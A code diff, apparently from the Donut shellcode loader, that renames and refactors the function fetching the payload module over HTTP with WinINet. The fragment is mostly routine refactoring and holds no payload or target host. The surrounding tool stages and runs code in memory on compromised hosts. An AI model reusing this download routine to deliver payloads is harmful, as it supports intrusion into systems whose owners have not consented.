@@ -29,14 +29,14 @@
   OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
 
-BOOL DownloadModule(PDONUT_INSTANCE inst) {
+BOOL DownloadFromHTTP(PDONUT_INSTANCE inst) {
     HINTERNET       hin, con, req;
     PBYTE           buf;
     DWORD           s, n, rd, len, code=0;
     BOOL            bResult = FALSE, bSecure = FALSE;
     URL_COMPONENTS  uc;
-    CHAR            host[DONUT_MAX_URL], 
-                    file[DONUT_MAX_URL];
+    CHAR            host[DONUT_MAX_NAME], 
+                    file[DONUT_MAX_NAME];
     
     // default flags for HTTP client
     DWORD flags = INTERNET_FLAG_KEEP_CONNECTION   | 
@@ -50,13 +50,13 @@ BOOL DownloadModule(PDONUT_INSTANCE inst) {
     uc.dwStructSize     = sizeof(uc);
     uc.lpszHostName     = host;
     uc.lpszUrlPath      = file;
-    uc.dwHostNameLength = DONUT_MAX_URL;
-    uc.dwUrlPathLength  = DONUT_MAX_URL;
+    uc.dwHostNameLength = DONUT_MAX_NAME;
+    uc.dwUrlPathLength  = DONUT_MAX_NAME;
     
-    DPRINT("Decoding URL %s", inst->http.url);
+    DPRINT("Decoding URL %s", inst->server);
     
     if(!inst->api.InternetCrackUrl(
-      inst->http.url, 0, ICU_DECODE, &uc)) {
+      inst->server, 0, ICU_DECODE, &uc)) {
       return FALSE;
     }
     
@@ -87,10 +87,10 @@ BOOL DownloadModule(PDONUT_INSTANCE inst) {
         
     if(con != NULL) {
       DPRINT("Creating HTTP %s request for %s", 
-        inst->http.req, file);
+        inst->http_req, file);
         
       req = inst->api.HttpOpenRequest(
-              con, inst->http.req, 
+              con, inst->http_req, 
               file, NULL, NULL, NULL, flags, 0);
               
       if(req != NULL) {
